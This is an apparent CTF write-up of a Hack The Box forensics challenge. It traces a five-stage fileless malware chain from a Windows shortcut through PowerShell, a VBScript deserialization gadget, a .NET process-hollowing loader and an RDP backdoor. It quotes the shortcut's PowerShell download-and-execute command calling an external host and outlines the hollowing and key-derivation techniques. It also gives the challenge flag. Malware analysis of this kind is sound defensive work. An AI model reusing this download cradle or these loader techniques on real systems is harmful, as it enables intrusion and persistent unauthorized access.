# Highlight: Time Dilation — the breadth showcase

**Category:** Forensics
**Difficulty:** Hard
**Time to solve:** ~60 minutes
**Why it makes the post:** Single challenge that touches every domain — Windows, .NET, x86 reverse engineering, cryptography, network forensics, file format parsing, and a moment of pop-culture pattern recognition. If you want one example to argue "no human carries this breadth in their head," this is it.

## What we were given

Two files:
- `BlackHole Time Dilation Calculator.lnk` — a Windows shortcut file
- `time.pcap` — a packet capture

The flavor text was a Back to the Future / Interstellar mashup. Someone "dropped a sample of malware that claims to calculate time dilation around Antares." Standard CTF dressing.

## What it actually was

A complete fileless-malware delivery chain in five stages:

**Stage 1 — LNK file.** Parsed with `pylnk3`. Target was `powershell.exe`. Command-line arguments:

> `-c IEX (New-Object Net.WebClient).DownloadString('http://windowsliveupdater.com/r.ps1')`

Window mode: minimized (hidden). The LNK metadata claimed the file was 450KB (matching a real `powershell.exe` size) — spoofed to look legitimate to anyone clicking.

**Stage 2 — `r.ps1` (the first PowerShell).** Recovered from the pcap. Was numerically encoded — `-join [char[]](36, 99, 104, 97, ...)` — which decodes to ASCII and then `IEX`-evals. The decoded script:

> Generates a random 10-character filename, downloads `mal.vbs` to `$env:TEMP\<random>.vbs`, sets the hidden file attribute, and invokes it via `wscript.exe` from 32-bit PowerShell.

**Stage 3 — `mal.vbs` (the dropper).** Almost 200KB of VBScript. Used the BinaryFormatter / GadgetToJScript pattern: base64-decode a large blob into a `MemoryStream`, deserialize it with `BinaryFormatter`, which through a delegate-serialization-holder gadget chain ends up calling `Assembly.Load(byte[])` — reflectively loading an embedded .NET DLL into memory. Zero files written; the entire payload exists as a string in the script.

**Stage 4 — The embedded .NET DLL.** ~117KB. Three classes: `SpaceTravel.Cipher` (Rijndael-256/256 CBC + PBKDF2), `SpaceTravel.CMemoryExecute` (process hollowing — `CreateProcess` + `NtUnmapViewOfSection` + `NtWriteVirtualMemory` + `NtGetContextThread` + `NtSetContextThread` + `NtResumeThread`), and `SpaceTravel.Singularity` (the orchestrator). The orchestrator:

- Reads `C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe` (legitimate Microsoft Visual Basic compiler)
- Takes the first 2 bytes of that file (which are always `MZ` = `0x4D 0x5A` — the DOS executable magic)
- Uses those 2 bytes as a uint16 (`0x5A4D` = 23117) seed for `new System.Random(23117)`
- Generates 32 deterministic pseudo-random bytes; base64-encodes them; that's the AES password
- Decrypts a 54,060-character base64 blob embedded in the DLL using Rijndael-256/256 CBC, salt = first 32 bytes, IV = next 32 bytes, PBKDF2 with 299 iterations
- The decrypted result: a 40KB native Win32 PE
- Process-hollows `vbc.exe` and injects the PE into it

The key derivation is the elegant part. The encryption key is never stored anywhere on disk. It's *derived from the DOS magic bytes of any Windows PE file*. The malware author can guarantee that any Windows machine has a PE file at a known path, so the key material is "deterministic but not constant."

**Stage 5 — The final-stage PE.** Pure native, ~40KB. Imports: `NetUserAdd`, `NetLocalGroupAddMembers`. The point of the entire chain: create a Windows user account and add them to the "Remote Desktop Users" group. Persistent backdoor via RDP.

The flag wasn't an output of any stage. It was XOR-encoded with a 23-byte rotating key — the literal string `"Canopus - Alpha Carinae"` — and stashed in the final-stage binary's `.rdata` section right after a UTF-16 `Antares\0` marker.

## The pop-culture moment

The flag's encoding key was "Canopus - Alpha Carinae." Canopus is the brightest star in the constellation Carina; the challenge text talked about Antares (Alpha Scorpii). Two stars, one a misdirect, one the answer. The flag plaintext: `HTB{h3avy_Pr0cc3s_h0ll0w1ng_l3ads_t0_s1ngular1ty!}` — naming the technique (heavy process hollowing leads to singularity) and the orchestrator class (`SpaceTravel.Singularity`).

Earlier in the chain, when Simona first ran the extracted binary, it printed a greeting in Old Irish: *"Anáil nathrach, ortha bháis is beatha, do chéal déanaimh!"* That's the spell Merlin uses in John Boorman's *Excalibur* (1981). Alex's first instinct was that someone built this challenge knowing AI would try to solve it and seeded the strings to throw off pattern-matchers. (Probably wasn't deliberate in this case — but the category of "adversarial CTF design against AI" is real and emerging.)

## How we cracked it without running it

Running the final stage would have meant executing real malware on our machines. Instead:

- Used `pylnk3` for the shortcut metadata
- Used `scapy` to reassemble TCP streams from the pcap and extract the two HTTP response bodies
- Decoded the numeric-PowerShell stage manually
- Pulled the .NET assembly out of the BinaryFormatter blob by locating the PE magic (`MZ` at offset 1223 inside the gadget)
- Used `dnfile` to parse the .NET assembly metadata
- Walked the `#US` (user strings) heap manually to find the encrypted blob
- Read the IL of `Singularity..ctor` via `monodis` (installed mid-session via Homebrew)
- Wrote a C# decryption helper that loaded the malware's own `Cipher.Decrypt` via reflection — calling the malware's decryption routine WITHOUT instantiating the orchestrator class (which would have triggered process hollowing)
- Compiled with `mcs`, ran with `mono`
- Got the final PE; ran `strings` and `objdump` on it
- Found the XOR-encoded blob; tried "Canopus" as the key (5 chars matched, then garbage); tried the full "Canopus - Alpha Carinae" string and the whole flag decoded cleanly

The whole chain runs on macOS without ever executing Windows malware. That's the analyst's discipline: treat the sample as data, never as code, even when you have to invoke parts of it (reflectively call `Decrypt` without instantiating the side-effecting orchestrator).

## The breadth claim

To solve this one challenge, a participant had to understand:

- Windows LNK file format
- pcap parsing + TCP reassembly + HTTP body extraction
- PowerShell encoding tricks
- VBScript BinaryFormatter deserialization gadgets ("GadgetToJScript")
- .NET reflection, IL, metadata heaps
- DOS / PE file format
- AES / Rijndael cryptography (and the difference between them)
- PBKDF2 key derivation
- x86-64 disassembly of the native final stage
- Windows NetAPI (NetUserAdd, RDP user group)
- XOR cipher attack
- Star nomenclature (Canopus vs Antares)
- Recognizing a 1981 John Boorman film quote in Old Irish

This is one challenge. Out of 19 solved. Multiply by 19 and you get the actual surface a participant had to span.

## Suggested LinkedIn quote

> "One forensics challenge took us through a Windows shortcut file, a packet capture, two stages of PowerShell, a VBScript BinaryFormatter deserialization gadget, a reflectively-loaded .NET assembly, a Rijndael-256 decryption whose key was derived from the DOS magic bytes of `vbc.exe`, and finally a native Win32 executable that XOR-encoded the flag with the name of the *wrong* star. To solve this one challenge, a human needed working knowledge of Windows internals, .NET reflection, network forensics, cryptography, x86 assembly, and apparently *Excalibur* (1981). Pattern recognition across that breadth is exactly what AI is unreasonably good at."
